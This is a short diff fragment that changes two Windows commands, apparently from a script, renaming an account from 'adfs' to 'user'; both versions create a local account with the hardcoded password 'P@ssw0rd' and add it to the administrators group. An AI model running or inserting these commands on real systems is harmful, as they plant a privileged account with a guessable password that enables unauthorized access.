@@ -1,6 +1,6 @@
-net user /add adfs "P@ssw0rd"
+net user /add user "P@ssw0rd"
 
-net localgroup administrators adfs /add
+net localgroup administrators user /add
 
 
 
